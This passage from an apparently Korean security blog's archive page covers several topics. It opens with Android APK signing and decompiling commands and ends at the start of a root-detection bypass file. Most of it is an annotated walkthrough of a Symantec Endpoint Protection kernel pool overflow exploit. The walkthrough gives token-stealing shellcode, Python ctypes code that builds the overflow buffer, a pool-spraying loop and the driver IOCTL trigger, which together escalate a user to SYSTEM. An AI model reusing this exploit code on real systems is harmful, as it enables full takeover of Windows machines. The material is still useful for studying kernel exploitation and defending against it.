</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Code Signing</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>
</span><span class='line'>$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore application.apk alias_name
</span><span class='line'>
</span><span class='line'>$ openssl pkcs7 -inform DER -in CERT.RSA -text -print_certs
</span><span class='line'>
</span><span class='line'>$ keytool -printcert -file CERT.RSA</span></code></pre></td></tr></table></div></figure>


<h4>Dex Tools</h4>

<ul>
<li>smali/baksmali</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ java -jar baksmali.jar app.apk
</span><span class='line'>$ jav -jar smali.jar -o classes.dex out/
</span><span class='line'>
</span><span class='line'>$ java -jar baksmali.jar -a 19 -x Settings.odex -d framework
</span><span class='line'>$ java -jar smali.jar -a 19 -o Settings.dex out/</span></code></pre></td></tr></table></div></figure>


<ul>
<li>IDA</li>
<li>dex2jar</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ d2j-dex2jar.sh agent.apk -o agent.jar</span></code></pre></td></tr></table></div></figure>


<ul>
<li>JEB</li>
<li>apktool</li>
<li>jadx</li>
<li>jad</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/14/arp-cache-poisoning/">ARP Cache Poisoning</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-14T21:22:47+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:22 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/14/symantec-endpoint-protection-kernel-pool-overflow/">Symantec Endpoint Protection - Kernel Pool Overflow</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-14T21:21:58+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:21 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://www.exploit-db.com/exploits/34272/">Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow</a></p>

<p>참고할만한 문서들은</p>

<ul>
<li><a href="http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel">Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1</a></li>
<li><a href="https://www.youtube.com/watch?v=-smvfojecvs">Project Heapbleed, BalCCon2k14</a></li>
<li><a href="http://www.slideshare.net/scovetta/kernelpool">Modern Kernel Pool Exploitation: Attacks and Techniques</a></li>
<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
<li><a href="http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf">Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf">Access token stealing on Windows, Csaba Barta, 2009</a></li>
<li><a href="http://www.uninformed.org/?v=3&amp;a=4&amp;t=pdf">Kernel-mode Payloads on Windows, bugcheck and skape</a></li>
<li><a href="http://www.uninformed.org/?v=6&amp;a=2&amp;t=pdf">Exploiting 802.11 Wireless Driver Vulnerabilities on Windows</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf">Remote Windows Kernel Exploitation: Step into the Ring 0</a></li>
<li><a href="http://securityvulns.ru/docs4946.html">Win32 Device Drivers Communication Vulnerabilities, Lord Yup</a></li>
<li><a href="http://www.suse.de/~krahmer/no-nx.pdf">x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique</a></li>
<li>infamous HalDispatchTable</li>
<li>j00ru&rsquo;s research</li>
<li><a href="http://www.alex-ionescu.com/?p=231">Alex&rsquo;s lonescu research</a></li>
<li>Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011</li>
<li>Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008</li>
<li>SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005</li>
<li><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">Windows 8 Heap Internals</a></li>
<li><a href="https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf">GDI Font Fuzzing in Windows Kernel for Fun</a></li>
<li><a href="http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf">Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel</a></li>
<li><a href="http://j00ru.vexillium.org/?p=290">GDT and LDT in Windows kernel vulnerability exploitation</a></li>
<li>SoBelt X'con 2005</li>
<li>Kostya Kortchinsky SyScan 2008</li>
<li>Tarjei Mandt BH DC 2011</li>
</ul>


<h4>Exploit Strategy</h4>

<p><a href="http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html">OkayToCloseProcedure callback kernel hook</a></p>

<ul>
<li>IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.</li>
<li>ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.</li>
<li>이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.</li>
<li>OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.</li>
<li>Shellcode 는 Type Index 를 repair 하고, <code>nt authority\SYSTEM</code> 을 훔친다.</li>
</ul>


<h4>Token Stealing Shellcode</h4>

<p>Exploit 에서 사용된 shellcode 는 token stealing shellcode.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tokenstealing = (
</span><span class='line'>"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
</span><span class='line'>"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
</span><span class='line'>"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
</span><span class='line'>"\x00"
</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>


<p>Disassemble 해봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>33c0                    xor eax,eax
</span><span class='line'>648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>8b4050                  mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>8bc8                    mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>2db8000000              sub eax,0xb8
</span><span class='line'>83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>75ec                    jne loc_0000000e
</span><span class='line'>8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>8991f8000000            mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>c21000                  ret 0x10</span></code></pre></td></tr></table></div></figure>


<p><code>EPROCESS</code> 구조체에서 <code>Token</code> 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
<code>SYSTEM</code> 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.</p>

<p>Target 이 IDLE 상태라면, <code>FS:[0x124]</code> 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.</p>

<h4>Hotpatching SYSFER.DLL</h4>

<ol>
<li>VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.</li>
<li>할당받은 메모리에 크기 <code>0x44c</code> 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.</li>
<li>SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다.</li>
<li>저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 <code>child_block</code> 과 <code>child_block_size</code> 의 주소를 찾아낸다.</li>
<li>2 번의 메모리 주소로 <code>child_block</code> 을 overwrite 한다. 이제 <code>child_block</code> 은 악의적인 데이터를 포인팅한다.</li>
<li><code>0x44c</code> 로 <code>child_block_size</code> 를 overwrite 한다.</li>
</ol>


<h4>Evil child_block</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>""" Allocate the source buffer in the parent process """
</span><span class='line'>v = kernel32.VirtualAllocEx(phandle, 
</span><span class='line'>        0x0, 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        MEM_RESERVE|MEM_COMMIT, 
</span><span class='line'>        PAGE_EXECUTE_READWRITE)
</span><span class='line'># 8654c580  040c0090 ef436f49 00000000 0000005c
</span><span class='line'># 8654c590  00000000 00000000 00000001 00000001
</span><span class='line'># 8654c5a0  00000000 0008000a
</span><span class='line'>quota   = "\x00\x00\x00\x00"   
</span><span class='line'>header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00"
</span><span class='line'># TypeIndex = "\x0a\x00\x08\x00"
</span><span class='line'>TypeIndex = "\x00\x00\x08\x00"
</span><span class='line'>offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
</span><span class='line'>overflow  = offset + quota + header + TypeIndex 
</span><span class='line'>csrc      = create_string_buffer(overflow, evil_child_block_size)
</span><span class='line'>wrote     = c_ulong(0)
</span><span class='line'>res = kernel32.WriteProcessMemory(phandle, v, 
</span><span class='line'>        addressof(csrc), 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        byref(wrote))</span></code></pre></td></tr></table></div></figure>


<p><code>IoCompletionReserve</code> 오브젝트를 overwrite 할 것인데, <code>TypeIndex</code> 가 원래는 <code>0x0A</code> 인데 <code>0x00</code> 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.</p>

<p>아래의 <code>TypeIndex</code> 를 0 으로 overwrite 한다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
</span><span class='line'>+0x000 PointerCount : Int4B
</span><span class='line'>+0x004 HandleCount : Int4B
</span><span class='line'>+0x004 NextToFree : Ptr32 Void
</span><span class='line'>+0x008 Lock : _EX_PUSH_LOCK
</span><span class='line'>+0x00c TypeIndex : UChar &lt;- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
</span><span class='line'>+0x00d TraceFlags : Uchar
</span><span class='line'>+0x00d DbgRefTrace : Pos 0, 1 Bit
</span><span class='line'>+0x00d DbgTracePermanent : Pos 1, 1 Bit
</span><span class='line'>+0x00e InfoMask : UChar
</span><span class='line'>+0x00f Flags : UChar
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p><code>ObTypeIndexTable</code> 을 보면,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dd nt!ObTypeIndexTable 
</span><span class='line'>81a3edc0 00000000 bad0b0b0 85543768 855436a0
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _OBJECT_TYPE 85543768
</span><span class='line'>+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
</span><span class='line'>...
</span><span class='line'>+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 TypeInfo 를 까보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
</span><span class='line'>+0x000 Length               : 0x50
</span><span class='line'>...
</span><span class='line'>+0x04c OkayToCloseProcedure : (null)</span></code></pre></td></tr></table></div></figure>


<p><code>0x28</code> + <code>0x4c</code> = <code>0x74</code> 이니까, <code>Type Index</code> 를 0 으로 세팅하면 <code>0x00000000 + 0x74</code> 에서 <code>OkayToCloseProcedure</code> 를 읽게된다.</p>

<h4>allocShellcode()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\x42" * 0x70
</span><span class='line'>
</span><span class='line'>OkayToCloseProcedure (0x00000078)
</span><span class='line'>
</span><span class='line'>ADD ESI,0C
</span><span class='line'>MOV DWORD PTR DS:[ESI],8000A
</span><span class='line'>SUB ESI,0C # RESTORE TypeIndex
</span><span class='line'>
</span><span class='line'>xor eax,eax # Token stealing shellcode
</span><span class='line'>mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>sub eax,0xb8
</span><span class='line'>cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>jne loc_0000000e
</span><span class='line'>mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>ret 0x10
</span><span class='line'>
</span><span class='line'>"\x90"
</span><span class='line'>"\x90"
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이 쉘코드를 NtAllocateVirtualMemory() 로 <code>0x00000004</code> 에 allocate 한다.</p>

<h4>Spray()</h4>

<p>Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
from the non-paged kernel pool.</p>

<p>When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.</p>

<p>exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>global handles, done
</span><span class='line'>handles = {}
</span><span class='line'>for i in range(0,5000):
</span><span class='line'>    hHandle = HANDLE(0)
</span><span class='line'>    ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
</span><span class='line'>    handles[hHandle.value] = hHandle</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">Exploits for MS10-058, Jeremy Fetiveau</a></li>
<li><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406</a></li>
</ul>


<h4>NtAllocateReserveObject()</h4>

<p>In short, <code>NtAllocateReserveObject</code> makes it possible for any system user to allocate a buffer
on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
As it will turn out later in this paper, the above can give us pretty much control over the
kernel memory, when exploiting custom vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define APC_OBJECT              0
</span><span class='line'>#define IO_COMPLETION_OBJECT    1
</span><span class='line'>#define MAX_OBJECT_ID           1
</span><span class='line'>
</span><span class='line'>NTSTATUS STDCALL NtAllocateReserveObject(
</span><span class='line'>    OUT PHANDLE hObject,
</span><span class='line'>    IN  POBJECT_ATTRIBUTE ObjectAttributes,
</span><span class='line'>    IN  DWORD ObjectType)
</span><span class='line'>{
</span><span class='line'>    PVOID ObjectBuffer;
</span><span class='line'>    HANDLE hOutputHandle;
</span><span class='line'>    NTSTATUS NtStatus;
</span><span class='line'>
</span><span class='line'>    if (PreviousMode == UserMode) {
</span><span class='line'>        // Validate hObject
</span><span class='line'>    }
</span><span class='line'>    if (ObjectType &gt; MAX_OBJECT_ID) {
</span><span class='line'>        /* Bail out: STATUS_INVALID_PARAMETER
</span><span class='line'>         */
</span><span class='line'>    } else {
</span><span class='line'>        NtStatus = ObCreateObject(PreviousMode,
</span><span class='line'>                                    PspMemoryReserveObjectTypes[ObjectType],
</span><span class='line'>                                    ObjectAttributes,
</span><span class='line'>                                    PreviousMode,
</span><span class='line'>                                    0,
</span><span class='line'>                                    PspMemoryReserveObjectSizes[ObjectType],
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    &ObjectBuffer);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>
</span><span class='line'>        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);
</span><span class='line'>
</span><span class='line'>        if (ObjectType == IO_COMPLETION) {
</span><span class='line'>            //
</span><span class='line'>            // Perform some ObjectBuffer initialization
</span><span class='line'>            //
</span><span class='line'>            ObjectBuffer[0x0C] = 3;
</span><span class='line'>            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
</span><span class='line'>            ObjectBuffer[0x24] = ObjectBuffer;
</span><span class='line'>            ObjectBuffer[0x28] = 0;
</span><span class='line'>        }
</span><span class='line'>        NtStatus = ObInsertObjectEx(ObjectBuffer,
</span><span class='line'>                                    &hOutputHandle,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0xF0003,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>        *hObject = hOutputHandle;
</span><span class='line'>    }
</span><span class='line'>    return NtStatus;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>DeviceIoControl()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL WINAPI DeviceIoControl(HANDLE hDevice,
</span><span class='line'>                            DWORD dwIoControlCode,
</span><span class='line'>                            LPVOID lpInBuffer,
</span><span class='line'>                            DWORD nInBufferSize,
</span><span class='line'>                            LPVOID lpOutputBuffer,
</span><span class='line'>                            DWORD nOutBufferSize,
</span><span class='line'>                            LPDWORD lpBytesReturned,
</span><span class='line'>                            LPOVERLAPPED lpOverlapped);</span></code></pre></td></tr></table></div></figure>


<p>파라메터중에서 중요한 것은 <code>hDevice</code>, <code>dwIoControlCode</code>, <code>lpInBuffer</code>, <code>lpOutputBuffer</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dwReturn = c_ulong()
</span><span class='line'>
</span><span class='line'>evil_input = "\x41" * 4 + struct.pack("&lt;L", 0x00222084) + "D" * 56
</span><span class='line'>
</span><span class='line'>evil_size = len(evil_input)
</span><span class='line'>einput = create_string_buffer(evil_input, evil_size)
</span><span class='line'>eoutput = create_string_buffer("\x00" * 1024, 1024)
</span><span class='line'>driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
</span><span class='line'>...
</span><span class='line'>kernel32.DeviceIoControl(driver_handle, 0x00222084, 
</span><span class='line'>                            addressof(einput), evil_size, 
</span><span class='line'>                            addressof(eoutput), 1024, 
</span><span class='line'>                            byref(dwReturn), None)</span></code></pre></td></tr></table></div></figure>


<p>이 커맨드가 <code>SYSPLANT.sys</code> 의 <code>DriverDispatcher()</code> 에 날라가면 <code>SYSFER.dll</code> 의 <code>child_block</code> 에 담가둔 오염된 데이터때문에 <code>SYSPLANT.sys</code> 가 뻘짓을 하게 되는 흐름.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/10/root-detection-on-android-is-useless/">Root Detection on Android Is Useless</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T21:50:03+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:50 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://github.com/serianox/rd">@Serianox_: Root detection on Android is useless, so I wrote 200 lines of (ugly) C to prove it. :3</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
